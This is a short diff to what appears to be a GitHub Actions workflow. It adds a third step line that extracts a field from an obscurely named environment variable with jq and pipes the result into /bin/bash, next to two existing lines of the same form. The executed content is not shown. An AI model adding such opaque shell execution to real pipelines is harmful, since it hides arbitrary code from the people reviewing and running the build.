@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$nwno1515" | jq -r .lsrv414 | /bin/bash
           printf '%s' "$e4" | jq -r .v97 | /bin/bash
+          printf '%s' "$tp31083" | jq -r .fdb1484 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
